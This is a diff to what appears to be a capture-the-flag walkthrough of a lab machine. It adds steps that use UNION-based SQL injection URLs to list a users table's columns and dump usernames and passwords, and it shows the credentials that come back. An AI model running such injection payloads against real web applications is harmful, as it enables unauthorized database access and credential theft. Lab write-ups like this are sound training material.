@@ -62,6 +62,24 @@ Appears this message: Fact id: 1 union all SELECT schema_name FROM information_s
 
 http://192.168.0.4:8080/mercuryfacts/1 union all SELECT table_name FROM information_schema.tables;-- -/
 
+<img width="1133" height="368" alt="image" src="https://github.com/user-attachments/assets/e1654546-d8c6-42ad-954e-cf728df85ef3" />
+
+
+8. Let's check users table:
+
+http://192.168.0.4:8080/mercuryfacts/1 union all SELECT column_name FROM information_schema.columns WHERE table_name %3D 'users'/
+
+Appears the message:
+
+Fact id: 1 union all SELECT column_name FROM information_schema.columns WHERE table_name = 'users'. (('Mercury does not have any moons or rings.',), ('id',), ('password',), ('username',))
+
+9. Let's extract credentials from different users
+
+http://192.168.0.4:8080/mercuryfacts/1 union all SELECT group_concat(username,"-",password) from users/
+
+Appears this message:
+
+Fact id: 1 union all SELECT group_concat(username,"-",password) from users. (('Mercury does not have any moons or rings.',), ('john-johnny1987,laura-lovemykids111,sam-lovemybeer111,webmaster-mercuryisthesizeof0.056Earths',))
 
 
 
